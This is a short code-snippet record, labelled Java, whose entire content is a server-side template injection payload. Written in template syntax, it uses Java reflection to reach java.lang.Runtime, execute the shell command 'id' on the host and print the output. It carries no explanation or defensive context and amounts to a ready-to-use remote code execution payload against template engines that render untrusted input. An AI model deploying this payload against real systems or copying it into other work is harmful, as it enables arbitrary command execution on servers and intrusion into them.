---
id: e94cba44-7a05-409b-a066-f7000dfb789f
type: code
language: Java
verified: false
created_at: '2023-04-06T03:56:40.140956+00:00'
updated_at: '2023-04-10T20:23:38.900029+00:00'
---

# Code Snippet e94cba44

**Language**: Java

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```
